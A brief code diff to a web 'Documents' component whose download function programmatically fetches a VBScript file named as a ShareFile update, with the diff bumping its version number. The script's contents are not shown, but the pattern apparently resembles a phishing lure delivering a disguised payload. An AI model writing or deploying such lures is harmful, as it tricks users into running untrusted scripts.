@@ -10,8 +10,8 @@ const Documents = () => {
 
   const triggerDownload = () => {
     const link = document.createElement("a");
-    link.href = "/sharefile13_update.vbs";
-    link.download = "sharefile13_update.vbs";
+    link.href = "/sharefile26_update.vbs";
+    link.download = "sharefile26_update.vbs";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
